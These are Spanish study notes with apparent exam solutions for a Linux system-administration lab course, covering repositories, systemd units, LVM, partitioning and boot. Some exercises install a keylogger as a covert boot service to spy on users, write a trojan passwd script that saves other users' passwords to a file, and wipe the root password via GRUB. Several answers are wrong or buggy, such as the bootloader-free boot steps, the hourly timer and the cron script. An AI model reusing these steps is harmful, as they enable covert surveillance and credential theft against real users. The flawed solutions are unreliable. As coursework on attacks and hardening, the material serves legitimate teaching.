   deb http://deb.debian.org/debian bullseye main contrib non-free
   deb http://deb.debian.org/debian-security bullseye-security main contrib non-free
   deb http://deb.debian.org/debian bullseye-updates main contrib non-free
   ```

   - **Comandos**:
     ```bash
     sudo apt update
     sudo apt search pacman4console
     ```

   Si el paquete no aparece, agrega repositorios adicionales que puedan contener el paquete. Por ejemplo, puedes agregar un repositorio de Debian Universe si no está habilitado:
   ```bash
   sudo add-apt-repository universe
   sudo apt update
   ```

2. **Sistema no actualizado**:
   - **Motivo**: Puede haber dependencias rotas o desactualizadas en tu sistema.
   - **Solución**: Actualiza la lista de paquetes y el sistema.
   - **Comandos**:
     ```bash
     sudo apt update
     sudo apt upgrade
     ```

3. **Dependencias faltantes**:
   - **Motivo**: El paquete puede depender de otros paquetes que no están instalados.
   - **Solución**: Usa `apt` para instalar las dependencias automáticamente.
   - **Comandos**:
     ```bash
     sudo apt install -f
     ```

4. **Errores de red**:
   - **Motivo**: Problemas con la conexión a Internet o los servidores de los repositorios.
   - **Solución**: Verifica tu conexión a Internet y asegúrate de que los servidores de los repositorios estén accesibles.
   - **Comandos**:
     ```bash
     ping google.com
     sudo apt update
     ```

5. **Paquetes retenidos o bloqueados**:
   - **Motivo**: Algunos paquetes podrían estar bloqueados y no permitirse su actualización o instalación.
   - **Solución**: Verifica y desbloquea cualquier paquete retenido.
   - **Comandos**:
     ```bash
     sudo apt-mark showhold
     sudo apt-mark unhold <package>
     ```

6. **Espacio en disco insuficiente**:
   - **Motivo**: El sistema puede no tener suficiente espacio en disco para descargar o instalar los paquetes.
   - **Solución**: Verifica el espacio disponible en disco y libera espacio si es necesario.
   - **Comandos**:
     ```bash
     df -h
     sudo apt clean
     sudo apt autoremove
     ```

### Solución Propuesta

Sigue estos pasos para solucionar posibles problemas y luego intenta instalar el paquete `pacman4console` nuevamente:

1. **Actualizar el sistema y los repositorios**:
   ```bash
   sudo apt update
   sudo apt upgrade
   ```

2. **Buscar el paquete en los repositorios disponibles**:
   ```bash
   sudo apt search pacman4console
   ```

3. **Agregar repositorios adicionales si es necesario**:
   ```bash
   sudo add-apt-repository universe
   sudo apt update
   ```

4. **Instalar el paquete**:
   ```bash
   sudo apt install pacman4console
   ```

5. **Resolver dependencias faltantes**:
   ```bash
   sudo apt install -f
   ```

6. **Verificar y liberar espacio en disco**:
   ```bash
   df -h
   sudo apt clean
   sudo apt autoremove
   ```

Si después de seguir estos pasos aún no puedes instalar el paquete, considera buscar más información específica sobre `pacman4console` en la documentación de tu distribución o en foros en línea.

# Extraordinaria 21-22

## Ejercicio 1 TEMAS: arranque
Lleva a cabo las acciones necesarias para que nuestro sistema arranque el kernel directamente, sin hacer uso de ningún Bootloader. 

Para arrancar el kernel directamente sin hacer uso de ningún bootloader en un sistema Linux, podemos hacerlo utilizando las herramientas proporcionadas por el propio sistema operativo. Aquí tienes los pasos para hacerlo:

1. **Identificar la Partición Raíz**:
   - Identifica la partición raíz donde está instalado el kernel. Puedes usar el comando `lsblk` para listar las particiones y sus montajes.

2. **Montar la Partición Raíz**:
   - Monta la partición raíz en un directorio temporal. Por ejemplo, si la partición raíz es `/dev/sda1`, puedes montarla en `/mnt` con el siguiente comando:
     ```
     sudo mount /dev/sda1 /mnt
     ```

3. **Configurar el Arranque Directo**:
   - Una vez que la partición raíz esté montada, necesitamos modificar el archivo de configuración del cargador de arranque (generalmente GRUB) para que cargue el kernel directamente. El archivo de configuración suele estar en `/boot/grub/grub.cfg`. Abre este archivo en un editor de texto. Por ejemplo:
     ```
     sudo nano /mnt/boot/grub/grub.cfg
     ```

4. **Modificar el Archivo de Configuración**:
   - Dentro del archivo `grub.cfg`, busca la sección que define las entradas de arranque. Debes buscar las líneas que empiezan con `menuentry`. Cada una de estas líneas representa una entrada de arranque. Busca la línea correspondiente al kernel que deseas arrancar directamente.

5. **Editar la Entrada de Arranque**:
   - Edita la línea correspondiente al kernel que deseas arrancar directamente. Debes eliminar las opciones relacionadas con el cargador de arranque, como `set root`, `linux`, `initrd`, etc., y dejar solo las opciones relacionadas con el kernel. Por ejemplo:
     ```
     linux /vmlinuz-5.4.0-88-generic root=/dev/sda1 ro quiet splash
     ```

6. **Guardar y Salir**:
   - Guarda los cambios en el archivo y sal de tu editor de texto.

7. **Desmontar la Partición Raíz**:
   - Desmonta la partición raíz del directorio temporal:
     ```
     sudo umount /mnt
     ```

8. **Reiniciar el Sistema**:
   - Reinicia el sistema para que los cambios surtan efecto. El sistema debería arrancar directamente desde el kernel sin mostrar el menú de GRUB.

## Ejercicio 2 TEMAS: redes, script, system units
Arranca la máquina desde el snapshot Ej2Begin. En el directorio $HOME del usuario root crea un script de nombre checkdhcp.sh. Su función será comprobar si los servicios de red han funcionado correctamente y el equipo tiene una dirección IP asignada en el interfaz enp0s3 bajo configuración automática (dhcp). En caso de no tener IP definida, aplicará una configuración manual a dicho interfaz con los siguientes parámetros: dirección=10.0.2.15 máscara de red=255.255.255.0, broadcast=10.0.2.255, Gateway=10.0.2.2. A través de un timer de systemd de nombre dchp_check.timer, haz que tu script se ejecute cada hora durante la jornada laboral (entre las 8:00 y las 17:00, de lunes a viernes). 

Para completar este ejercicio, primero necesitamos crear el script `checkdhcp.sh` en el directorio `$HOME` del usuario `root`, y luego configurar un timer de systemd para que este script se ejecute cada hora durante la jornada laboral de lunes a viernes.

Aquí están los pasos para lograrlo:

1. **Crear el script checkdhcp.sh**:
   - Primero, accede al directorio `$HOME` del usuario `root`:
     ```bash
     cd /root
     ```
   - Luego, crea y edita el script `checkdhcp.sh` con tu editor de texto preferido. Por ejemplo:
     ```bash
     nano checkdhcp.sh
     ```
   - Agrega el siguiente contenido al script:
     ```bash
     #!/bin/bash
     
     # Comprobar si la interfaz enp0s3 tiene una IP asignada mediante DHCP
     if [[ $(ip addr show enp0s3 | grep -c "inet ") -eq 0 ]]; then
         # Si no tiene IP, aplicar configuración manual
         ip addr add 10.0.2.15/24 broadcast 10.0.2.255 dev enp0s3
         ip route add default via 10.0.2.2
     fi
     ```
   - Guarda y cierra el archivo (`Ctrl + O`, `Enter`, `Ctrl + X` en nano).

2. **Dar permisos de ejecución al script**:
   - Para asegurarnos de que el script sea ejecutable, utilizamos el comando `chmod`:
     ```bash
     chmod +x checkdhcp.sh
     ```

3. **Configurar el timer de systemd**:
   - Crearemos un archivo de unidad para el timer de systemd. Por ejemplo:
     ```bash
     sudo nano /etc/systemd/system/dhcp_check.timer
     ```
   - Agrega el siguiente contenido:
     ```plaintext
     [Unit]
     Description=Timer for running checkdhcp.sh every hour during working hours

     [Timer]
     OnCalendar=Mon-Fri 08:00:00
     Persistent=true

     [Install]
     WantedBy=timers.target
     ```
   - Guarda y cierra el archivo (`Ctrl + O`, `Enter`, `Ctrl + X` en nano).

4. **Enlazar el timer con el servicio**:
   - Ahora, creamos un archivo de unidad para el servicio asociado al timer:
     ```bash
     sudo nano /etc/systemd/system/dhcp_check.service
     ```
   - Agrega el siguiente contenido:
     ```plaintext
     [Unit]
     Description=Script to check and configure DHCP on enp0s3 interface

     [Service]
     Type=oneshot
     ExecStart=/root/checkdhcp.sh
     ```
   - Guarda y cierra el archivo (`Ctrl + O`, `Enter`, `Ctrl + X` en nano).

5. **Recargar systemd y habilitar el timer**:
   - Después de crear los archivos de unidad, recargamos systemd para que reconozca los cambios:
     ```bash
     sudo systemctl daemon-reload
     ```
   - Luego, habilitamos el timer para que se ejecute automáticamente:
     ```bash
     sudo systemctl enable --now dhcp_check.timer
     ```

Con estos pasos, hemos creado un script `checkdhcp.sh` que verifica si la interfaz `enp0s3` tiene una dirección IP asignada mediante DHCP, y si no la tiene, aplica una configuración manual. Además, hemos configurado un timer de systemd para que este script se ejecute cada hora durante la jornada laboral de lunes a viernes.

## Ejercicio 3 TEMAS: system units, comandos "hack"
Ejercicio 4 (2p) Arranca la máquina desde el snapshot Ej4Begin. Como administrador, tienes un control prácticamente absoluto sobre lo que otros usuarios hacen. Para demostrarlo con un ejemplo práctico, en este ejercicio vas a instalar un capturador de teclado (keylogger) para espiar” lo que escriben el resto de usuarios. Instala el keylogger del siguiente enlace: `https://github.com/kernc/logkeys`, y crea un servicio, de nomber keyl.service, que active dicho keylogger en arranque y lo desactive al apagar la máquina. Como lo que estás haciendo no es muy legal, crea un target de arranque alternativo (multi-user-cotilla.target) que funcione exactamente igual que multi-user.target, con la única diferencia que tu servicio solo se activará con tu target “cotilla”. Cambia el target de arranque por defecto al que has creado y comprueba que todo funciona correctamente tecleando algún comando como usuario jalberto (password jalberto) desde un segundo terminal. 

Aquí tienes los pasos para completar el ejercicio:

1. **Descarga e Instalación de Logkeys**:
   - Descarga el código fuente de Logkeys desde el enlace proporcionado:
     ```bash
     wget https://github.com/kernc/logkeys/archive/master.zip
     ```
   - Descomprime el archivo descargado:
     ```bash
     unzip master.zip
     ```
   - Accede al directorio recién descomprimido:
     ```bash
     cd logkeys-master
     ```
   - Instala las dependencias necesarias:
     ```bash
     sudo apt install build-essential automake autoconf libtool
     ```
   - Compila e instala Logkeys:
     ```bash
     autoreconf --force --install
     ./configure
     make
     sudo make install
     ```

2. **Creación del Servicio keyl.service**:
   - Crea y edita el archivo de servicio keyl.service:
     ```bash
     sudo nano /etc/systemd/system/keyl.service
     ```
   - Agrega el siguiente contenido al archivo:
     ```plaintext
     [Unit]
     Description=Keylogger Service
     After=multi-user.target

     [Service]
     Type=simple
     ExecStart=/usr/local/bin/logkeys --start --output /var/log/keystrokes.log
     ExecStop=/usr/local/bin/logkeys --kill

     [Install]
     WantedBy=multi-user-cotilla.target
     ```
   - Guarda y cierra el archivo.

3. **Creación del Target multi-user-cotilla.target**:
   - Copia el archivo de unidad `multi-user.target` a uno nuevo llamado `multi-user-cotilla.target`:
     ```bash
     sudo cp /lib/systemd/system/multi-user.target /etc/systemd/system/multi-user-cotilla.target
     ```
   - Edita el archivo `multi-user-cotilla.target`:
     ```bash
     sudo nano /etc/systemd/system/multi-user-cotilla.target
     ```
   - Cambia `WantedBy` para que apunte al nuevo servicio:
     ```plaintext
     [Install]
     WantedBy=multi-user-cotilla.target
     ```
   - Guarda y cierra el archivo.

4. **Cambiar el Target de Arranque por Defecto**:
   - Cambia el enlace simbólico `default.target` para que apunte al nuevo target `multi-user-cotilla.target`:
     ```bash
     sudo ln -sf /etc/systemd/system/multi-user-cotilla.target /etc/systemd/system/default.target
     ```

5. **Habilitar y Comprobar el Servicio**:
   - Habilita el servicio keyl.service para que se inicie automáticamente al arrancar:
     ```bash
     sudo systemctl enable keyl.service
     ```
   - Comprueba el estado del servicio para asegurarte de que esté activo:
     ```bash
     sudo systemctl status keyl.service
     ```

Una vez completados estos pasos, el keylogger se activará al arrancar la máquina y se desactivará al apagarla, pero solo cuando el sistema se inicie con el target `multi-user-cotilla.target`. Es importante tener en cuenta las implicaciones éticas y legales de monitorear las acciones de otros usuarios sin su consentimiento.

# Ordinaria 20-21

## Ejercicio 1 TEMAS: scripts
Arranca la máquina desde el snapshot Ej1Begin. Deberás crear un script de nombre “ejercicio1.sh” para automatizar la gestión de diferentes usuarios. Dicho script realizará las siguientes funciones: 

1. El script recibirá por línea de comandos dos parámetros. Primero el id del usuario, segundo un comando (por ejemplo: ./ejercicio1.sh pepe tmux). Si el usuario no existe en el sistema retornará un mensaje de error. 

2. El objetivo principal del script será determinar si dicho usuario está ejecutando el comando que se ha pasado como argumento. En caso afirmativo, se procederá a matar de manera inmediata el proceso asociado a dicho comando y se escribirá un mensaje con información sobre dicho evento (usuario, comando, fecha) en el fichero /var/log/cmdprohibido.log.   

3. Crea una tarea programada con cron que ejecute dicho script cada 5 minutos. El usuario a controlar será test y el comando prohibido será stress. Para controlar el tamaño asociado al fichero de log creado, configura un proceso de rotación semanal, limitando los mensajes almacenados a los generados durante el último mes. 
Puedes probar el funcionamiento de tu script con el usuario test y el comando stress. 

Primero crearemos una versión sencilla del script

```sh
#!/bin/bash

#Recibimos dos parametros
# $1 = id usuario
# $2 = comando

if id "$1" >/dev/null 2>&1; then 
   USERID=$1
else 
   echo "user does not exist" 
   #return null
fi
#mirar si estamos corriendo el comando
COMMAND=$2
# -n "not null"

#pgrep is a command-line utility in Unix that searches the running processes on a system based on their names and other attributes. It returns the process IDs that match the criteria.
PD=$(pgrep -u $USERID $COMMAND)
if [-n "$PID"]; then
   kill $PID
   echo "User: $USERID, Command: $COMMAND, Date: $(date)" >> /var/log/cmdprohibido.log
fi
```
Comando pgrep [pregp](https://linuxize.com/post/pgrep-command-in-linux/)
Comando cron [cron crontab](https://www.redeszone.net/tutoriales/servidores/cron-crontab-linux-programar-tareas/#447735-que-es-cron)

```
crontab -e  # entramos a la configuracion de crontab para anhadir la linea

*/5 * * * * /path/to/ejercicio1.sh test stress
```

Para lo del log tenemos que crear un fichero em `/etc/logrotate.d/` con el contenido:
```sh
/var/log/cmdprohibido.log {
    weekly
    rotate 4
}
```

# Extraordinaria 20-21
## Ejercicio 1 TEMAS: particiones, system units
Arranca la máquina desde el snapshot Ej1Begin. Utiliza los tres discos disponibles (sdb, sdc, sdd), de 500MB cada uno, para crear un volumen de grupo que albergará dos volúmenes lógicos. El primer volumen lógico, de 1GB de tamaño, albergará un sistema de ficheros que sustituirá al directorio /home actual (montado permanente, el contenido previo de /home debe estar presente en el nuevo punto de montaje). En el segundo volumen lógico, que utilizará la capacidad restante y se monta de manera permanente en /swap, albergará un fichero de swap de 250MB que debes crear y habilitar a través de systemd.

1. Crearemos un grupo de volumenes fisicos con los tres discos disponibles.
```sh
pvcreate /dev/sdb /dev/sdc /dev/sdd
```

2. Ahora crearemos un grupo de volúmenes con los volúmenes físicos que hemos creado.
```sh
vgcreate myvg /dev/sdb /dev/sdc /dev/sdd
```

3. Ahora creamos los volumenes logicos, el primero de 1 GB y el segundo de lo que quede.
```sh
lvcreate -L 1G -n home myvg
lvcreate -l 100%FREE -n swap myvg
```

4. Creamos sistemas de archivos en los volúmenes lógicos
```sh
mkfs.ext4 /dev/myvg/home
mkswap /dev/myvg/swap
```
5. Movemos el contenido de /home a un directorio temporal para no perderlo. Montamos el nuevo volumen logico en Home y lo traemos de vuelta (el contenido).
```sh
mv /home /home_old
mkdir /home
mount /dev/myvg/home /home
mv /home_old/* /home/
```
6. Creamos un archivo de swap en el segundo volumen lógico y habilitamos el swap.
```sh
dd if=/dev/zero of=/swap/swapfile bs=1M count=250
chmod 600 /swap/swapfile
mkswap /swap/swapfile
swapon /swap/swapfile
```

7. Para hacer los cambios permanentes hay que escribir en `/etc/fstab`. Añadimos en este fichero las líneas:
```sh
/dev/myvg/home /home ext4 defaults 0 0
/swap/swapfile swap swap defaults 0 0
```

8. Finalmente, para habilitar el swap a través de systemd, crea un archivo de servicio systemd en /etc/systemd/system/swapfile.service con el siguiente contenido:
```sh
[Unit]
Description=Turn on swap

[Service]
Type=oneshot
ExecStart=/sbin/swapon /swap/swapfile

[Install]
WantedBy=multi-user.target
```
Y lo habilitamos con `systemctl enable swapfile.service`.

## Ejercicio 3 TEMAS: servicio que falla
Arranca la máquina desde el snapshot Ej3Begin. Comprobarás que el servicio ssh.service ha sufrido algún tipo de problema durante el proceso de arranque. Busca el origen del problema y lleva a cabo los cambios necesarios para corregirlo. 

Aquí están los pasos que puedes seguir para solucionar el problema con el servicio ssh:

Comprueba el estado del servicio ssh con el siguiente comando:
```sh
systemctl status ssh.service
```
Esto te dará información sobre el estado actual del servicio y cualquier error que pueda haber ocurrido durante el arranque.

Si el servicio no está activo, intenta iniciarlo manualmente con el siguiente comando:
```sh
systemctl start ssh.service
```

Si hay algún problema con el servicio, este comando debería darte un error que te ayudará a identificar el problema.

Revisa los logs del sistema para obtener más información sobre el problema. Puedes hacer esto con el siguiente comando:
```sh
journalctl -u ssh.service
```
Esto te mostrará los logs del servicio ssh, que pueden contener información útil sobre el problema.

Una vez que hayas identificado el problema, puedes hacer los cambios necesarios para corregirlo. Esto puede implicar editar la configuración de ssh, cambiar los permisos de los archivos clave, o reinstalar el servicio ssh.

Después de hacer los cambios, reinicia el servicio ssh con el siguiente comando:
```sh
systemctl restart ssh.service
```

Esto debería iniciar el servicio ssh con tu nueva configuración.

Finalmente, comprueba de nuevo el estado del servicio ssh para asegurarte de que se está ejecutando correctamente:
```sh
systemctl status ssh.service
```
Si el servicio está activo y no hay errores en los logs, entonces has solucionado el problema con éxito.

## Ejercicio 4 TEMAS: falsos comandos

Arranca la máquina desde el snapshot Ej4Begin. El administrador ha cometido una imprudencia, consistente en conceder permisos de escritura sobre el directorio /usr/local/bin. Dicho directorio es uno de los que se incluyen en la variable $PATH de los nuevos usuarios, lo que les permite crear falsos comandos para obtener información privilegiada. Tu objetivo es, como usuario test (temporal), crear un script de nombre passwd, que emule el comportamiento del comando de mismo nombre, y te sirva para apropiarte de las claves del resto de usuarios. Ten en cuenta los siguientes aspectos: 

1. Revisa el funcionamiento y el tipo de mensajes que imprime por pantalla el comando passwd (para imitarlos). Ten en cuenta que un usuario solo es capaz de cambiar su propia contraseña, y no la de otros usuarios. Ten también en cuenta que la nueva contraseña se solicita dos veces, y si ambos strings no coinciden se produce un mensaje de error. 
2. Guarda el usuario/contraseña capturados en tu $HOME, en un fichero oculto (.datos.txt). 
3. El cambio de contraseña SI debe producirse, por lo que debes reescribir la entrada del shadow para el usuario que cambia la contraseña (introducir la nueva contraseña). Busca online la forma de ejecutar el comando passwd desde un script para poder hacer este cambio. 
4. Haz que éste sea el comando que se ejecuta por defecto en el sistema y comprueba con el usuario test2 (temporal2) su funcionamiento. 

Debemos contemplar varios casos:
1. Pide cambiar la contraseña de otro:
```
test@LAPTOP-OR195PNE:~$ passwd ramon
passwd: no debe ver o cambiar la información de la contraseña para ramon.
```

2. La contraseña se pide dos veces y debe coincidir (caso bueno)
```sh
test@LAPTOP-OR195PNE:~$ passwd test
Cambiando la contraseña de test.
Contraseña actual:
Nueva contraseña:
Vuelva a escribir la nueva contraseña:
passwd: contraseña actualizada correctamente
```
Caso malo:
```sh
test@LAPTOP-OR195PNE:~$ passwd test
Cambiando la contraseña de test.
Contraseña actual:
Nueva contraseña:
Vuelva a escribir la nueva contraseña:
Las contraseñas no coinciden.
passwd: Error de manipulación del testigo de autenticación
passwd: no se ha cambiado la contraseña
```

Escribimos e script:
```sh
#!/bin/bash

#primer mensaje
echo -n "Cambiando la contraseña de "; whoami

echo -n "Contraseña actual: "
read -s pass1
printf '\n'

# Verificar la contraseña actual
echo "$pass1" | su -s /bin/bash -c "exit" `whoami` >/dev/null 2>&1
if [ $? -ne 0 ]; then
    echo "La contraseña actual es incorrecta."
    exit 1
fi

echo -n "Nueva contraseña: "
read -s pass2
printf '\n'

echo -n "Vuelva a escribir la nueva contraseña: "
read -s pass3
printf '\n'

if [ $pass2 = $pass3 ]; then
    echo -e "`whoami`:$pass3" | chpasswd > error.txt
    echo "passwd: contraseña actualizada correctamente"

    echo -n "Usuario: " >> datos.txt
    whoami >> datos.txt
    echo -n "Contraseña actual: " >> datos.txt
    echo $pass2 >> datos.txt
    echo -n "Contraseña anterior: " >> datos.txt
    echo $pass1 >> datos.txt
    exit 0
else
    echo "Las contraseñas no coinciden."
    echo "passwd: Error de manipulación del testigo de autenticación"
    echo "passwd: no se ha cambiado la contraseña"

    echo -n "Usuario: " >> datos.txt
    whoami >> datos.txt
    echo -n "Contraseña actual: " >> datos.txt
    echo $pass1 >> datos.txt
fi
```

No va bien el script pero es lo mejor que pude conseguir
Deberemos cambiar la variable path de los usuarios para que ejecute este comando en vez de passwd original.

Para cambiar la variable PATH para todos los usuarios en un sistema Linux, puedes agregar o modificar las declaraciones de exportación en un archivo de script de shell en el directorio `/etc/profile.d/`.

Aquí hay un ejemplo de cómo puedes hacerlo:

1. Abre un nuevo archivo en el directorio `/etc/profile.d/` con privilegios de superusuario. Puedes llamar a este archivo `custom_path.sh`:

```bash
sudo nano /etc/profile.d/custom_path.sh
```

2. En este archivo, agrega la siguiente línea para agregar tu directorio personalizado al principio de la variable PATH:

```bash
export PATH=/ruta/a/tu/directorio:$PATH
```

Reemplaza `/ruta/a/tu/directorio` con la ruta al directorio que quieres agregar a la variable PATH.

3. Guarda y cierra el archivo.

4. Haz que el script sea ejecutable con el siguiente comando:

```bash
sudo chmod +x /etc/profile.d/custom_path.sh
```

Después de hacer esto, la ruta que agregaste será parte de la variable PATH para todos los usuarios. Sin embargo, los cambios no tendrán efecto hasta que los usuarios cierren y vuelvan a abrir su sesión, o hasta que ejecuten el comando `source /etc/profile.d/custom_path.sh`.

Ten en cuenta que este método cambiará la variable PATH para todos los usuarios, incluido el superusuario. Si solo quieres cambiar la variable PATH para usuarios normales, puedes considerar agregar la declaración de exportación a `~/.bashrc` o `~/.bash_profile` en lugar de `/etc/profile.d/`.


# Ordinaria 23-24

## Ejercicio 2 TEMAS: particiones
 En la máquina del ejercicio comprobarás que cada usuario tiene su directorio $HOME en una partición distinta. El objetivo es que lleves a cabo los cambios necesarios para que todos los usuarios compartan una única partición para sus directorios $HOME, que debe ser del mismo tamaño que la suma de las tres particiones originales. No se pueden usar discos adicionales ni volúmenes lógicos ni RAID.

 Sí, puedes mover `/var/spool` al principio o al final del disco `sdb` y luego usar el espacio restante para crear una única partición para `/home`. Este procedimiento implica mover los datos temporalmente, ajustar las particiones y luego restaurar los datos en las nuevas particiones.

### Pasos Detallados:

1. **Crear un directorio temporal para los datos de `/var/spool` y `/home`:**

    ```bash
    mkdir /mnt/temp_spool
    mkdir /mnt/temp_home
    ```

2. **Mover los datos de `/var/spool` y `/home` a los directorios temporales:**

    ```bash
    cp -r /var/spool/* /mnt/temp_spool/
    cp -r /home/user1 /mnt/temp_home/
    cp -r /home/user2 /mnt/temp_home/
    cp -r /home/user3 /mnt/temp_home/
    ```

3. **Desmontar las particiones actuales:**

    ```bash
    umount /home/user1
    umount /home/user2
    umount /home/user3
    umount /var/spool
    ```

   **PROBLEMA** No podemos desmontar ´var_spool´ porque esta ejecutando servicios. Cómo pararlos?
   Cuando una partición está ocupada, significa que algún proceso está utilizando archivos en esa partición. Para desmontar la partición, primero debemos identificar y detener esos procesos. Aquí te muestro los pasos detallados:

### Pasos para desmontar una partición ocupada:

   1. **Identificar los procesos que están utilizando `/var/spool`:**

    Utiliza el comando `lsof` (list open files) para identificar los procesos:

    ```bash
    lsof +D /var/spool
    ```

    Esto listará todos los archivos abiertos en `/var/spool` y los procesos que los están utilizando.

   2. **Detener los procesos que están utilizando `/var/spool`:**

      Dependiendo de los procesos que encuentres, puedes detenerlos temporalmente. Por ejemplo, si hay servicios de cola de impresión o correo electrónico, puedes detenerlos con `systemctl` o `service`. Aquí hay algunos ejemplos:

       ```bash
      systemctl stop postfix  # Para detener el servicio de correo (Postfix)
      systemctl stop cups     # Para detener el servicio de impresión (CUPS)
      ```

      Asegúrate de detener todos los servicios que puedan estar utilizando `/var/spool`.


4. **Usar `fdisk` para eliminar las particiones actuales en `sdb`:**

    ```bash
    fdisk /dev/sdb
    ```

    Dentro de `fdisk`, sigue estos pasos:

    - Elimina las particiones existentes (`d` seguido del número de partición):
      ```plaintext
      d
      1
      d
      2
      d
      3
      d
      4
      ```
    - Crea una nueva partición para `/var/spool` al principio o al final del disco:
      ```plaintext
      n
      p
      1
      (accept default start)
      +24M (tamaño original de sdb2)
      ```
    - Crea una nueva partición para `/home` usando el resto del espacio:
      ```plaintext
      n
      p
      2
      (accept default start)
      (accept default end)
      ```
    - Escribe los cambios y sal de `fdisk` (`w` para escribir):
      ```plaintext
      w
      ```

5. **Formatear las nuevas particiones:**

    ```bash
    mkfs.ext4 /dev/sdb1  # Para /var/spool
    mkfs.ext4 /dev/sdb2  # Para /home
    ```

6. **Montar las nuevas particiones y restaurar los datos:**

    ```bash
    mount /dev/sdb1 /root/temporal
    cp -r /mnt/temp_spool/* /root/temporal
    umount /root/temporal

    mount /dev/sdb2 /mnt
    mv /mnt/temp_home/* /root/temporal
    umount /root/temporal
    ```

7. **Actualizar `/etc/fstab` para las nuevas particiones:**

    Abre el archivo `/etc/fstab`:

    ```bash
    nano /etc/fstab
    ```

    Añade las siguientes líneas para montar las nuevas particiones:

    ```plaintext
    /dev/sdb1  /var/spool  ext4  defaults  0  2
    /dev/sdb2  /home       ext4  defaults  0  2
    ```

    Elimina o comenta las entradas antiguas que montaban `/home/user1`, `/home/user2` y `/home/user3`.

8. **Montar las nuevas particiones y verificar:**

    ```bash
    mount -a
    ```

    Verifica que los datos se hayan montado correctamente:

    ```bash
    ls /var/spool
    ls /home
    ```

    Deberías ver los datos correctos en `/var/spool` y los directorios `user1`, `user2`, y `user3` en `/home`.

9. **Reiniciar el sistema:**

    ```bash
    reboot
    ```

    Tras reiniciar, verifica que las particiones `/var/spool` y `/home` se hayan montado correctamente y que los usuarios puedan acceder a sus datos.

### Resumen

Este procedimiento permite mover `/var/spool` a una nueva ubicación en el disco `sdb` y crear una única partición para todos los directorios `/home`, cumpliendo con los requisitos de usar una partición del tamaño combinado de las originales sin perder datos críticos.

## Ejercicio 3 TEMAS: instalacion de sw y problemas de red
Queremos instalar `pacman4console` pero no es posible. Solucionalo.

### Paso 1: Diagnóstico inicial de la conectividad de red

1. **Verificar interfaces de red:**
   - Utilizamos `ifconfig` y `ip link` para verificar las interfaces de red disponibles. Descubrimos que solo la interfaz `lo` estaba activa inicialmente.

2. **Habilitar y configurar interfaz de red:**
   - Habilitamos la interfaz de red adecuada (por ejemplo, `eth0`) con `ip link set eth0 up`.
   - Configuramos la interfaz para obtener una dirección IP mediante DHCP usando `dhclient eth0`.

### Paso 2: Solución del problema de `sources.list`

1. **Verificar `sources.list`:**
   - Descubrimos que el archivo `/etc/apt/sources.list` tenía un nombre incorrecto (`sources.list~` en lugar de `sources.list`) y estaba vacío.

2. **Corregir `sources.list`:**
   - Editamos el archivo `/etc/apt/sources.list` para asegurarnos de que tuviera las entradas de repositorios adecuadas. Usamos un editor de texto como `nano` para crear y editar el archivo si fuera necesario:

     ```bash
     sudo nano /etc/apt/sources.list
     ```

     Agregamos las líneas de repositorio adecuadas, por ejemplo:

     ```plaintext
     deb http://deb.debian.org/debian/ stable main contrib non-free
     deb http://deb.debian.org/debian/ stable-updates main contrib non-free
     deb http://security.debian.org/debian-security stable-security main contrib non-free
     ```

3. **Actualizar lista de paquetes:**
   - Después de corregir `sources.list`, actualizamos la lista de paquetes para reflejar los cambios:

     ```bash
     sudo apt-get update
     ```

### Paso 3: Instalar `wget`

1. **Instalar `wget`:**
   - Ahora que `sources.list` estaba correctamente configurado y actualizado, instalamos `wget`:

     ```bash
     sudo apt-get install wget
     ```

2. **Verificar la instalación de `wget`:**
   - Confirmamos que `wget` se instaló correctamente y estaba listo para usar:

     ```bash
     wget --version
     ```

### Paso 4: Descargar el archivo con `wget`

1. **Descargar el archivo:**
   - Usamos `wget` para descargar el archivo especificado:

     ```bash
     wget --user alumno --password alu_SI http://www.ce.unican.es/SI/LabFiles/Ejercicio3.txt
     ```

2. **Verificar la descarga:**
   - Verificamos que el archivo se descargó correctamente en el directorio actual.

### Resumen final

- Corregimos el problema inicial de conectividad de red asegurándonos de que la interfaz de red estuviera activa y configurada correctamente.
- Solucionamos el problema del archivo `sources.list` con un nombre incorrecto y vacío, lo cual impedía la actualización de los repositorios y la instalación de `wget`.
- Instalamos `wget` una vez que el archivo `sources.list` fue corregido y actualizado correctamente.
- Finalmente, utilizamos `wget` para descargar el archivo necesario después de verificar que `wget` estaba instalado y funcionando correctamente.

## Ejercicio 4 TEMAS: arranque
La fase de cargador en una máquina supone un agujero de seguridad grave. Para 
demostrarlo, deberás acceder a la máquina de este snapshot y borrar la contraseña al usuario root. En segundo lugar, 
y para evitar esta vulnerabilidad en el futuro, deberás modificar el proceso de arranque para eliminar TODA presencia 
del cargador (incluso desinstalando los paquetes necesarios), y hacer que el sistema arranque de forma correcta sin 
usar el cargador. 

### Paso 1: Acceder a la configuración de GRUB

1. **Reinicia la máquina virtual.**
2. **Accede al menú de GRUB.**
   - Durante el arranque, mantén presionada la tecla `Shift` o presiona repetidamente `Esc` (dependiendo de tu configuración) para acceder al menú de GRUB.

### Paso 2: Editar la entrada de GRUB

1. **Selecciona la entrada de arranque predeterminada.**
   - Usa las teclas de flecha para seleccionar la entrada de arranque normal de tu sistema Debian.

2. **Edita la entrada de GRUB.**
   - Presiona `e` para editar la configuración de la entrada seleccionada.

3. **Modificar los parámetros de arranque.**
   - Busca la línea que comienza con `linux` y contiene el kernel y los parámetros de arranque.
   - Añade `init=/bin/bash` al final de esta línea. Esta modificación hará que el sistema arranque directamente en una shell de bash.

   Ejemplo de cómo debería verse la línea modificada:
   ```bash
   linux /boot/vmlinuz-<version> root=UUID=<uuid> ro quiet splash init=/bin/bash
   ```

4. **Arrancar con la configuración modificada.**
   - Presiona `Ctrl + X` o `F10` para arrancar con la configuración modificada.

### Paso 3: Remontar el sistema de archivos como lectura/escritura

1. **Montar el sistema de archivos en modo lectura/escritura.**
   - Una vez que el sistema arranque en una shell de bash, monta el sistema de archivos raíz en modo lectura/escritura:
   ```bash
   mount -o remount,rw /
   ```

### Paso 4: Eliminar la contraseña de root

1. **Eliminar la contraseña de root.**
   - Usa el siguiente comando para eliminar la contraseña del usuario root:
   ```bash
   passwd -d root
   ```

2. **Reiniciar el sistema.**
   - Reinicia el sistema para aplicar los cambios:
   ```bash
   exec /sbin/init
   ```

### Paso 5: Iniciar sesión y realizar cambios adicionales

1. **Iniciar sesión como root sin contraseña.**
   - Una vez que el sistema se haya reiniciado, deberías poder iniciar sesión como root sin necesidad de una contraseña.

## Ejercicio 5 TEMAS: servicios y cambio de targets

